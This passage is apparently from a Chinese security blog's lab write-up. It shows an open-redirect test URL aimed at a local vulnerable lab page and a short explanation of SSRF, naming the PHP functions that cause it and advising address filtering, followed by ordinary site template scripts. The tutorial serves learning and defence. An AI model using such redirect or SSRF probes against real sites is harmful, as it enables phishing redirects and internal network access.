+<span class="hljs-symbol">http:</span>/<span class="hljs-regexp">/192.168.2.137:8000/vul</span><span class="hljs-regexp">/urlredirect/urlredirect</span>.php?url=<span class="hljs-symbol">https:</span>/<span class="hljs-regexp">/www.baidu.com/</span></code></pre>
+
+<p><a href="https://imgchr.com/i/sGvOZ8" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/01/12/sGvOZ8.png" srcset="/img/loading.gif" alt="sGvOZ8.png"></a></p>
+<p>URL跳转<a href="https://www.baidu.com/" target="_blank" rel="noopener">https://www.baidu.com/</a></p>
+<p><a href="https://imgchr.com/i/sGvXdS" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/01/12/sGvXdS.png" srcset="/img/loading.gif" alt="sGvXdS.png"></a></p>
+<h3 id="SSRF服务端请求伪造"><a href="#SSRF服务端请求伪造" class="headerlink" title="SSRF服务端请求伪造"></a>SSRF服务端请求伪造</h3><p>其形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能,但又没有对目标地址做严格过滤与限制，导致攻击者可以传入任意的地址来让后端服务器对其发起请求，并返回对该目标地址请求的数据。</p>
+<p>数据流:攻击者—–&gt;服务器—-&gt;目标地址</p>
+<p>根据后台使用的函数的不同,对应的影响和利用方法又有不一样</p>
+<p>PHP中下面函数的使用不当会导致SSRF:<br>file_get_contents()<br>fsockopen()<br>curl_exec()</p>
+<p>如果一定要通过后台服务器远程去对用户指定(“或者预埋在前端的请求”)的地址进行资源请求,则请做好目标地址的过滤。</p>
+<p><a href="https://imgchr.com/i/sGvjIg" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/01/12/sGvjIg.png" srcset="/img/loading.gif" alt="sGvjIg.png"></a> </p>
+<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p>xss：<a href="https://www.cnblogs.com/ApricityJ/p/13255748.html" target="_blank" rel="noopener">https://www.cnblogs.com/ApricityJ/p/13255748.html</a></p>
+<p><a href="https://www.bilibili.com/video/BV1q4411S7XB" target="_blank" rel="noopener">https://www.bilibili.com/video/BV1q4411S7XB</a></p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/%E9%9D%B6%E5%9C%BA/">靶场</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/web/">web</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" target="_blank" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2020/12/28/Samba-CVE-2015-0240/">
+                        <span class="hidden-mobile">Samba未初始化指针释放远程代码执行漏洞(CVE-2015-0240)</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+              <!-- Comments -->
+              <article class="comments" id="comments">
+                
+                
+  <div id="vcomments"></div>
+  <script type="text/javascript">
+    function loadValine() {
+      addScript('https://cdn.staticfile.org/valine/1.4.14/Valine.min.js', function () {
+        new Valine({
+          el: "#vcomments",
+          app_id: "zJq4EoET2FEb1trGzTayy1uq-gzGzoHsz",
+          app_key: "oFcTVTBJYrfsIGdYNnoWMVJ9",
+          placeholder: "留下你的足迹",
+          path: window.location.pathname,
+          avatar: "retro",
+          meta: ["nick","mail","link"],
+          pageSize: "10",
+          lang: "zh-CN",
+          highlight: false,
+          recordIP: false,
+          serverURLs: "",
+        });
+      });
+    }
+    waitElementVisible('vcomments', loadValine);
+  </script>
+  <noscript>Please enable JavaScript to view the <a href="https://valine.js.org" target="_blank" rel="nofollow noopener noopener">comments
+      powered by Valine.</a></noscript>
+
+
+              </article>
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div id="tocbot"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+  </main>
+
+  
+    <a id="scroll-top-button" href="#" role="button">
+      <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+    </a>
+  
+
+  
+    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+  
+
+  
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+    
+<a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Hexo-Fluid</span></a>
+
+  </div>
+  
+  <div class="statistics">
+    
+    
+
+    
+      
+        <!-- 不蒜子统计PV -->
+        <span id="busuanzi_container_site_pv" style="display: none">
+            总访问量 
+            <span id="busuanzi_value_site_pv"></span>
+             次
+          </span>
+      
+      
+        <!-- 不蒜子统计UV -->
+        <span id="busuanzi_container_site_uv" style="display: none">
+            总访客数 
+            <span id="busuanzi_value_site_uv"></span>
+             人
+          </span>
+      
+    
+  </div>
+
+
+  
+
+  
+</footer>
+
+<!-- SCRIPTS -->
+<script  src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js" ></script>
+<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/main.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>
+  <script  src="/js/clipboard-use.js" ></script>
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+  <script  src="https://cdn.staticfile.org/tocbot/4.11.1/tocbot.min.js" ></script>
+  <script>
+    $(document).ready(function () {
+      var boardCtn = $('#board-ctn');
+      var boardTop = boardCtn.offset().top;
+
+      tocbot.init({
+        tocSelector: '#tocbot',
+        contentSelector: '#post-body',
+        headingSelector: 'h1,h2,h3,h4,h5,h6',
+        linkClass: 'tocbot-link',
+        activeLinkClass: 'tocbot-active-link',
+        listClass: 'tocbot-list',
+        isCollapsedClass: 'tocbot-is-collapsed',
+        collapsibleClass: 'tocbot-is-collapsible',
+        collapseDepth: 0,
+        scrollSmooth: true,
+        headingsOffset: -boardTop
+      });
+      if ($('.toc-list-item').length > 0) {
+        $('#toc').css('visibility', 'visible');
+      }
+    });
+  </script>
+
+
+
+
+
+  <script  src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js" ></script>
+  <script>
+    anchors.options = {
+      placement: "right",
+      visible: "hover",
+      
+    };
+    var el = "h1,h2,h3,h4,h5,h6".split(",");
+    var res = [];
+    for (item of el) {
+      res.push(".markdown-body > " + item)
+    }
+    anchors.add(res.join(", "))
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    var path = "/local-search.xml";
+    var inputArea = document.querySelector("#local-search-input");
+    inputArea.onclick = function () {
+      searchFunc(path, 'local-search-input', 'local-search-result');
+      this.onclick = null
+    }
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+  <script>
+    $('#post img:not(.no-zoom img, img[no-zoom]), img[zoom]').each(
+      function () {
+        var element = document.createElement('a');
+        $(element).attr('data-fancybox', 'images');
+        $(element).attr('href', $(this).attr('src'));
+        $(this).wrap(element);
+      }
+    );
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+    <!-- Baidu Analytics -->
+    <script defer>
+      var _hmt = _hmt || [];
+      (function () {
+        var hm = document.createElement("script");
+        hm.src = "https://hm.baidu.com/hm.js?d8cb5311ff5a7a66ad88e94f5290da89";
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(hm, s);
+      })();
+    </script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+</body>
+</html>
